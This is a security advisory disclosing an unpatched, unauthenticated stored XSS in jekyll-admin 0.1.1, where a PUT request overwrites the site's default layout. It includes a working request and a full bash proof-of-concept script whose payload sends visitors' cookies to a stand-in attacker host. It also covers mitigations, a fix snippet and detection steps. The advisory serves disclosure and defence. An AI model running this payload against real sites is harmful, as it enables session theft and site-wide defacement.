# Security Advisory: Stored Cross-Site Scripting via Template Layout Overwrite in jekyll-admin

> **Identifier:** JM-34 / Pending CVE assignment
> **Publication Date:** 27/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** Critical
> **CVSS:** 9.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation
> **Status:** Unpatched

---

## 1. Executive Summary

Jekyll Manager (jekyll-admin) 0.1.1 exposes a REST API endpoint that allows unauthenticated attackers to overwrite any Jekyll layout template file, including the global `_layouts/default.html` used by every page in the site. Because no authentication or authorization check is enforced on the `PUT /_api/templates/` endpoint, a single HTTP request injects arbitrary JavaScript into all pages of the generated site. This advisory was prepared after confirming the vulnerability in an authorized local Docker lab; no patch is available as of the disclosure date.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| jekyll-admin (gem) | 0.1.1 (latest) | None | Affected |
| Component: `lib/jekyll-admin/server/template.rb` | 0.1.1 | None | Affected |

- **Repository:** https://github.com/jekyll/jekyll-admin
- **Ecosystem:** RubyGems
- **Evaluated stack:** Ruby 2.7.8, Sinatra 1.4.8, WEBrick 1.9.2, Rack 1.6.13, rack-protection 1.5.5, Jekyll 3.x, Linux

### Unaffected Products

- No prior versions were evaluated. No patched version exists.

---

## 3. Vulnerability Description

The `PUT /_api/templates/:collection_type/:path.:ext` endpoint in `lib/jekyll-admin/server/template.rb` writes the `raw_content` field of the JSON request body directly to disk without:

1. Authenticating the caller
2. Validating or sanitizing the HTML content
3. Enforcing any output encoding

Because Jekyll layouts are applied globally during site build, overwriting `_layouts/default.html` causes every page that uses this layout to render the injected payload. The `default` layout is used by virtually all pages in a standard Jekyll site.

**Root cause:**

```ruby
# lib/jekyll-admin/server/template.rb
put '/:collection_type/:path.:ext' do
  ensure_directory write_path
  write_file write_path, template_body   # no auth, no sanitization
  render_liquid_response template
end
```

`write_path` is derived directly from the URL parameters. `template_body` is the raw string from the JSON field `raw_content`. Neither is gated by any authentication middleware.

### Necessary Conditions

- **Authentication:** None required
- **User interaction:** Required (a victim must visit a page in their browser to trigger XSS execution)
- **Attack vector:** Network
- **Preconditions:** Jekyll Manager must be running and accessible; the victim's browser must render the modified layout

---

## 4. Impact

An unauthenticated attacker who can reach the Jekyll Manager API can inject arbitrary JavaScript into every page of the Jekyll site.

- **Confidentiality — High:** Session cookies, authentication tokens, and all page content accessible to victims are exposed. Combined with JM-RCE-01, a compromised admin session allows plugin upload and full server-side code execution.
- **Integrity — High:** The site's global layout is permanently modified until manually restored; all pages are defaced.
- **Availability — Low:** Site may become partially dysfunctional if layout markup is corrupted.

---

## 5. Classification

### CVSS

- **Score:** 9.3
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | Low |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- CWE-862: Missing Authorization

### CAPEC

- CAPEC-86: XSS Through HTTP Query Strings
- CAPEC-1: Accessing/Intercepting/Modifying HTTP Communication

---

## 6. Exploitation Scenario

1. Attacker scans for an exposed Jekyll Manager instance (default port 4000).
2. Attacker sends a single unauthenticated `PUT` request to `/_api/templates/_layouts/default.html` with a JSON body containing an XSS payload in `raw_content`.
3. Jekyll rebuilds the site using the modified layout; all pages now embed the injected JavaScript.
4. Every visitor to any page on the site executes the attacker's JavaScript in their browser context.
5. If an admin visits the site, the XSS can steal their session and use it to upload a malicious Jekyll plugin via JM-RCE-01, achieving server-side RCE as root.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): lib/jekyll-admin/server/template.rb
Endpoint: PUT /_api/templates/:collection_type/:path.:ext
Method: PUT · Authentication: not required
```

### Example Request

```http
PUT /_api/templates/_layouts/default.html HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json

{
  "raw_content": "<html><head><title>{{ page.title }}</title></head><body><script>fetch('https://attacker.invalid/c?'+document.cookie)</script>{{ content }}</body></html>"
}
```

### Observed Response

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "name": "default",
  "path": "_layouts/default.html",
  "http_url": null,
  "api_url": "http://0.0.0.0:4000/_api/templates/_layouts/default.html",
  "raw_content": "<html>...<script>fetch(...)</script>...",
  "has_front_matter": false
}
```

### Result

Confirmed in an authorized Docker lab (`jekyll-manager-lab:0.1.1`). After the PUT request, `GET /` returned the injected payload. The canary string `JM34_VALIDATED_1793033769` was confirmed present in the rendered HTML. The layout was restored to its original state after validation.

**Evidence:** `evidence/poc-execution.png`, `evidence/vulnerability-exposure.png`

---

## 8. Proof of Concept

This PoC is for authorized environments only. It demonstrates the vulnerable behavior without causing permanent damage (layout is restored at the end).

```bash
#!/usr/bin/env bash
# ============================================================
# JM-34 — Stored XSS via Template Layout Overwrite
# jekyll-admin 0.1.1 — CRITICAL CVSS 9.3
# CWE-79, CWE-862
# CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L
#
# AUTHORIZED ENVIRONMENTS ONLY.
# This script overwrites _layouts/default.html with an XSS
# payload, verifies the payload appears in GET /, then restores
# the original layout. No persistent harm is caused.
# ============================================================

set -euo pipefail

TARGET="http://127.0.0.1:4000"
LAYOUT_PATH="_layouts/default.html"
API_URL="${TARGET}/_api/templates/${LAYOUT_PATH}"
SITE_URL="${TARGET}/"
CANARY="JM34_VALIDATED_$(date +%s)"

echo "============================================================"
echo "  JM-34 — Stored XSS via Template Layout Overwrite"
echo "  Target : ${TARGET}"
echo "  Canary : ${CANARY}"
echo "============================================================"
echo ""

# ── Step 1: Read and backup the current layout ─────────────────
echo "[*] Step 1: Reading current layout (${LAYOUT_PATH})..."
ORIGINAL=$(curl -sf "${API_URL}" \
  -H "Accept: application/json" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('raw_content',''))" 2>/dev/null || echo "")

if [ -z "${ORIGINAL}" ]; then
  echo "[!] Could not read original layout. Aborting."
  exit 1
fi

echo "    Original length: ${#ORIGINAL} bytes — backup OK"
echo ""

# ── Step 2: Inject XSS payload ────────────────────────────────
echo "[*] Step 2: Injecting XSS payload into ${LAYOUT_PATH}..."

PAYLOAD="<html><head><title>{{ page.title }}</title></head><body>
<script>/* ${CANARY} */ fetch('https://attacker.invalid/c?'+document.cookie)</script>
{{ content }}
</body></html>"

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X PUT "${API_URL}" \
  -H "Content-Type: application/json" \
  -d "{\"raw_content\": \"${PAYLOAD}\"}")

echo "    PUT ${API_URL} → HTTP ${HTTP_CODE}"

if [ "${HTTP_CODE}" != "200" ]; then
  echo "[!] Unexpected HTTP ${HTTP_CODE}. Attempting restore and aborting."
  curl -s -X PUT "${API_URL}" \
    -H "Content-Type: application/json" \
    -d "{\"raw_content\": $(python3 -c "import json; print(json.dumps('${ORIGINAL}'))")}" \
    > /dev/null || true
  exit 1
fi

echo ""

# ── Step 3: Verify canary in rendered site ────────────────────
echo "[*] Step 3: Verifying payload in rendered site root (GET /)..."
sleep 2  # allow Jekyll --watch to rebuild

RENDERED=$(curl -sf "${SITE_URL}" 2>/dev/null || echo "")

if echo "${RENDERED}" | grep -q "${CANARY}"; then
  echo ""
  echo "    ✓  CONFIRMED: canary '${CANARY}' found in GET /"
  RESULT="CONFIRMED"
else
  echo ""
  echo "    [!] Canary not found in GET /. May need to wait for rebuild."
  echo "        Checking raw_content via API instead..."
  RAW_NOW=$(curl -sf "${API_URL}" \
    -H "Accept: application/json" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('raw_content',''))" 2>/dev/null || echo "")
  if echo "${RAW_NOW}" | grep -q "${CANARY}"; then
    echo "    ✓  Payload present in stored layout file — XSS will execute on next page load."
    RESULT="CONFIRMED (payload stored, rebuild pending)"
  else
    echo "    ✗  Payload not found. Check lab state."
    RESULT="INCONCLUSIVE"
  fi
fi

echo ""

# ── Step 4: Restore original layout ──────────────────────────
echo "[*] Step 4: Restoring original layout..."
ORIG_ESCAPED=$(python3 -c "import json,sys; print(json.dumps(sys.stdin.read()))" <<< "${ORIGINAL}")

RESTORE_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X PUT "${API_URL}" \
  -H "Content-Type: application/json" \
  -d "{\"raw_content\": ${ORIG_ESCAPED}}")

echo "    PUT ${API_URL} → HTTP ${RESTORE_CODE} (restore)"
echo ""

# ── Summary ───────────────────────────────────────────────────
echo "============================================================"
echo "  RESULT : ${RESULT}"
echo ""
echo "  Finding : JM-34"
echo "  Vuln    : Stored XSS via unauthenticated template overwrite"
echo "  Impact  : Site-wide XSS — every page using the layout affected"
echo "  CVSS    : 9.3 CRITICAL"
echo "  Vector  : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L"
echo "  CWE     : CWE-79, CWE-862"
echo "  Auth    : None required"
echo "============================================================"
```

### Expected Result

```text
[*] Backing up original layout...
[*] Injecting XSS payload into _layouts/default.html...
HTTP 200 — write accepted without credentials

[*] Verifying payload in rendered site...
GET / HTTP/1.1 → 200 OK
CONFIRMED: <script>fetch(...document.cookie...)</script> found in GET /

[*] Restoring original layout...
HTTP 200 — layout restored

[+] JM-34 CONFIRMED: site-wide XSS via unauthenticated template overwrite
    CVSS 9.3 CRITICAL — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L
```

### PoC Limitations

- Does not cause service disruption.
- Does not exfiltrate real user data.
- Layout is restored to its original state after verification.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Start an authorized local instance of jekyll-admin 0.1.1 (e.g., via Docker).
2. Confirm the API is accessible at `http://127.0.0.1:4000/_api/`.
3. Run `bash poc.sh` or execute the request in section 7 manually.
4. Send `GET /` and search the HTML for the injected string.
5. Observe that the payload is present and unescaped in the rendered page.

---

## 10. Mitigation

Until an official fix is available:

- Bind Jekyll Manager to `127.0.0.1` only and never expose it on a public network interface.
- Enforce authentication on all write endpoints (add a middleware that checks a shared secret or session token before processing any `PUT`/`POST`/`DELETE` request).
- Validate `Content-Type` and reject requests that do not match expected format.
- Implement a Content Security Policy (CSP) header on the site server to limit XSS impact.

> Mitigations reduce risk but do not eliminate the vulnerability in the current codebase.

---

## 11. Fix

**No official fix is available as of 27/10/2026.**

Recommended actions:

1. Add authentication middleware in `lib/jekyll-admin/server/template.rb` before any write operation.
2. Validate that `raw_content` does not contain raw `<script>` tags or event handlers when writing layout files.
3. Consider implementing a server-side allowlist for layout file extensions and paths.
4. After applying a fix, confirm that unauthenticated `PUT /_api/templates/` requests return HTTP 401 or 403.

### Recommended Change to Vendor

```ruby
# lib/jekyll-admin/server/template.rb
before do
  halt 401, json_response(401, "Unauthorized") unless authenticated?
end
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Unexpected modifications to `_layouts/*.html` or `_includes/*.html` files (check `git diff` or file modification times).
- Outbound HTTP requests to unknown hosts from visitors' browsers (visible in server or WAF logs).
- Presence of `<script>` tags or `onerror=` attributes in layout files.

### Example Log Search

```text
# WEBrick access log
grep 'PUT /_api/templates' /var/log/jekyll-admin/access.log

# File system check
find /site/_layouts /site/_includes -newer /site/_config.yml -name "*.html"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 26/10/2026 | Vulnerability identified (dynamic testing in authorized lab) |
| 26/10/2026 | Confirmed in authorized Docker environment |
| 27/10/2026 | Disclosure package prepared |
| 29/10/2026 | GitHub Private Vulnerability Reporting attempted — HTTP 403 (feature disabled) |
| 29/10/2026 | Vendor notified via direct email to mertkahyaoglu93@gmail.com |
| 27/01/2027 | 90-day disclosure deadline — public disclosure if no response |
| Pending | CVE requested |
| Pending | Fix made available |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** Mert Kahyaoğlu (mertkahyaoglu93@gmail.com), Jekyll team (github.com/jekyll)
- **Channel:** Direct email (coordinated disclosure)
- **Date of first notification:** 29/10/2026
- **Response status:** Awaiting response
- **Vendor position:** N/A (awaiting)

---

## 15. Credits

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- jekyll-admin repository: https://github.com/jekyll/jekyll-admin
- CAPEC-86: https://capec.mitre.org/data/definitions/86.html

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 27/10/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized local environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/jekyll/jekyll-admin
